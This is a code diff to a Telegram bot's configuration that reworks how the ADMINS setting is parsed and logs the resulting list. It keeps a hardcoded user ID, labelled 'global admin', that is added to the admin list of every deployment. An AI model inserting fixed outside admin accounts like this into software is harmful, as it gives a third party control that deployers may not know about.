@@ -73,8 +73,28 @@ CLONE_BUTTON = get_bool(user_data.get("CLONE_BUTTON", True))
 LOG_CHANNEL = user_data.get("LOG_CHANNEL", "")
 PREMIUM_POINTS = get_int(user_data.get("PREMIUM_POINTS"))
 
-ADMINS = [int(x) for x in user_data.get("ADMINS", []) if str(x).isdigit()]
-FINAL_ADMINS = list(set(ADMINS + [6789146594]))
+#ADMINS = [int(x) for x in user_data.get("ADMINS", []) if str(x).isdigit()]
+#FINAL_ADMINS = list(set(ADMINS + [6789146594]))
+
+# Handle ADMINS properly
+raw_admins = user_data.get("ADMINS", [])
+
+if isinstance(raw_admins, str):
+    # Convert "123,456,789" → [123, 456, 789]
+    raw_admins = [x.strip() for x in raw_admins.split(",") if x.strip()]
+
+ADMINS = []
+for x in raw_admins:
+    try:
+        ADMINS.append(int(x))
+    except (TypeError, ValueError):
+        pass
+
+# Always include deployer + global admin
+FINAL_ADMINS = sorted(list(set(ADMINS + [USER_ID, 6789146594])))
+
+logger.info(f"✅ ADMINS list: {FINAL_ADMINS}, User ID: {USER_ID}")
+
 
 # ===================== INITIALIZE BOT =====================
 app = Client(
